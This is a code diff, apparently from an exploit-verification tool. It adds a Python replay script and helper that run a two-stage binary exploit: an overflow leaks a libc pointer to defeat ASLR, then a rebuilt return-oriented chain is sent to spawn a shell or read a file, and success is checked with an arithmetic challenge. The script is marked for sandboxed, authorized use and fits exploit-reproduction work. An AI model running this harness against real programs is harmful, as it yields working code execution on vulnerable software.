@@ -1348,6 +1348,127 @@ def shell_replay(mode: str, argv, stages, meta: dict) -> tuple[str, dict]:
              "stages.json": json.dumps(spec, indent=1).encode()})
 
 
+_LEAK_REPLAY = b'''#!/usr/bin/env python3
+"""Replay a TWO-STAGE exploit that defeats ASLR with a leak, and say whether it reproduced.
+
+leak.json holds what the live confirmation sent. Stage 1 (the overflow) makes the target print a
+libc pointer and return to its input loop; the pointer minus its symbol's offset is the libc
+base; stage 2 is rebuilt from that base -- each word is a constant or base-relative -- and sent
+into the same loop. Proof is then either a shell answering an arithmetic challenge (an echo
+cannot), or, for a chain that reads a file (seccomp-safe open/read/write), a random marker this
+script plants in a file and the target was never sent. Exit 0 = reproduced.
+RUN IN A SANDBOX/VM -- this executes an untrusted binary. Authorized use only."""
+import json
+import os
+import random
+import select
+import struct
+import subprocess
+import sys
+import time
+
+here = os.path.dirname(os.path.abspath(__file__))
+spec = json.load(open(os.path.join(here, "leak.json")))
+exe = sys.argv[1] if len(sys.argv) > 1 else "./target.bin"
+timeout = float(spec.get("timeout", 8))
+p = subprocess.Popen([exe] + list(spec.get("argv") or []), stdin=subprocess.PIPE,
+                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=here)
+
+
+def read_until(deadline, quiet=0.3):
+    out, last = b"", time.time()
+    while time.time() < deadline:
+        r, _, _ = select.select([p.stdout], [], [], 0.1)
+        if r:
+            chunk = os.read(p.stdout.fileno(), 4096)
+            if not chunk:
+                break
+            out, last = out + chunk, time.time()
+        elif p.poll() is not None:
+            break
+        elif out and time.time() - last > quiet:
+            break
+    return out
+
+
+def send(b):
+    try:
+        p.stdin.write(b)
+        p.stdin.flush()
+    except OSError:
+        pass
+
+
+def done(ok, why):
+    print(("\\n[+] " if ok else "\\n[-] ") + why)
+    try:
+        p.kill()
+    except OSError:
+        pass
+    sys.exit(0 if ok else 1)
+
+
+read_until(time.time() + 0.5)                            # the banner / first prompt
+send(bytes.fromhex(spec["stage1"]))
+burst = read_until(time.time() + timeout / 2)
+leak = spec["leak"]
+raw = burst[:8] if leak["kind"] == "write" else burst.split(b"\\n", 1)[0][:6]
+if len(raw) < 6:
+    done(False, "stage 1 printed no pointer: %r" % burst[:80])
+leaked = int.from_bytes(raw.ljust(8, b"\\0"), "little")
+base = leaked - int(leak["sym_off"])
+if base <= 0 or base & 0xFFF:
+    done(False, "leaked %#x is not the expected pointer (base %#x is not page-aligned)"
+         % (leaked, base))
+print("[*] leaked %#x -> libc base %#x" % (leaked, base))
+s2 = spec["stage2"]
+body = bytes.fromhex(s2["fill"]) + b"".join(
+    struct.pack("<Q", (int(v) + (base if rel else 0)) & 0xFFFFFFFFFFFFFFFF) for v, rel in s2["words"])
+send(bytes.fromhex(s2["pre"]) + body + bytes.fromhex(s2["post"]))
+time.sleep(0.3)
+if spec.get("proof") == "file":
+    token = "LYKOS_FILE_%08x" % random.getrandbits(32)
+    with open(os.path.join(here, "lykos_flag"), "w") as fh:
+        fh.write(token + "\\n")
+    send(b"lykos_flag\\0")                                 # the chain read()s the path, opens it
+    out = read_until(time.time() + timeout, quiet=1.2)
+    sys.stdout.write(out.decode("latin-1"))
+    done(token.encode() in out, "the chain disclosed a file it was never sent"
+         if token.encode() in out else "the planted file's contents did not come back")
+a, b = random.randint(1000, 9999), random.randint(1000, 9999)
+send(b"echo LYKOS_SHELL_$((%d*%d))\\n" % (a, b))
+out = read_until(time.time() + timeout, quiet=1.5)
+sys.stdout.write(out.decode("latin-1"))
+ok = (b"LYKOS_SHELL_%d" % (a * b)) in out
+done(ok, "a shell spawned and evaluated the challenge -- reproduced" if ok
+     else "no shell answered the challenge")
+'''
+
+
+def leak_replay(argv, stage1: bytes, leak: dict, stage2: dict, meta: dict,
+                proof: str = "shell", timeout: float = 8.0) -> tuple[str, dict]:
+    """(run_cmd, extra_files) for a two-stage leak exploit; sets meta's verdict.
+
+    `stage1`: the overflow bytes exactly as sent. `leak`: {kind: "puts"|"write", sym_off}.
+    `stage2`: {pre, post, fill, words: [[value, base_relative], ...]} -- the framing around the
+    second overflow, its filler, and its chain words relative to the leaked libc base. Rebuilding
+    stage 2 from these at replay time is what lets a base-specific exploit ship as a file: the old
+    ret2libc script hard-coded puts and system(), so a confirmed write() leak or one-gadget shipped
+    a reproducer that could not reproduce it, and the ORW bundle's "reproducer" ran nothing."""
+    meta["verdict"] = {"exit": "zero", "script": "runner.sh",
+                       "note": ("runner.sh exits 0 when the replayed chain disclosed a file it "
+                                "was never sent; 1 otherwise") if proof == "file" else
+                               SHELL_VERDICT["note"]}
+    spec = {"argv": [str(a) for a in argv or []], "stage1": bytes(stage1).hex(), "leak": leak,
+            "stage2": {"pre": bytes(stage2.get("pre") or b"").hex(),
+                       "post": bytes(stage2.get("post") or b"").hex(),
+                       "fill": bytes(stage2["fill"]).hex(),
+                       "words": [[int(v), bool(r)] for v, r in stage2["words"]]},
+            "proof": proof, "timeout": timeout}
+    return ("python3 ./replay_leak.py ./target.bin",
+            {"replay_leak.py": _LEAK_REPLAY, "leak.json": json.dumps(spec, indent=1).encode()})
+
+
 def build_secret(target_bytes: bytes, secrets: list, meta: dict) -> bytes:
     """Bundle a hard-coded-secret PoC: the binary, the extracted secret(s), and a pure-stdlib
     offline re-extractor that proves the credential is embedded (no target execution).
